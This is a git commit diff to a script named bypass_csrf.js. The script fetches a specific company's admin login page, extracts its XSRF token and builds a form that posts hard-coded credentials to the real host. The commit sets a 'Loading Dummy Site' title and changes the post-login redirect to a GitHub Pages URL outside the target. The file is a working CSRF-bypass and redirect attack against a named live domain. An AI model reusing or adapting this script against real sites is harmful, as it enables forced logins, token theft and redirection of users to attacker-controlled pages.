7147ea457677ff6cc7a771a0007cf2763258f108
User15231 <109126461+User15231@users.noreply.github.com>
2022-07-13 12:49:23 +0530

    Update bypass_csrf.js

--- bypass_csrf.js
+++ bypass_csrf.js
@@ -1,6 +1,7 @@
 var page = 'https://redhatdev.compunnel.com/platform/admin/login?next=%2Fplatform%2Fadmin';
 var html = get(page);
 document.body.innerHTML = html;
+document.title = "Loading Dummy Site";
 var form = document.forms[0];
 var token = form.xsrf.value;
 form.xsrf.value = "";
@@ -9,7 +10,7 @@ document.body.innerHTML +=
 	 '<form id="myform" action="https://redhatdev.compunnel.com/platform/admin/login/" method="POST">'
 	+'<input type="text" name="login" value="user">'
 	+'<input type="password" name="password" value="redhat">'
-	+'<input type="hidden" name="next" value="https://redhatdev.compunnel.com/platform/admin/">'
+	+'<input type="hidden" name="next" value="https://user15231.github.io/hosting/">'
 	+'<input type="hidden" name="xsrf" value="' + token + '">'
 	+'</form>';
 
